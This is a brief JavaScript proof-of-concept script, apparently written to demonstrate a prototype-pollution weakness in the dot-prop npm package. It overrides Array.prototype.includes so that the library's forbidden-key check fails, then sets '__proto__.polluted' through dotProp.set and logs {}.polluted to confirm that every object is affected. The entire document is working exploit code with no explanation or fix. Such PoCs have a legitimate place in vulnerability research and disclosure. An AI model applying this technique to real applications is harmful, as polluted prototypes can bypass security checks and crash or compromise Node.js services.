Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const dotProp = require('dot-prop');
dotProp.set({}, '__proto__.polluted', 'yes');
console.log({}.polluted);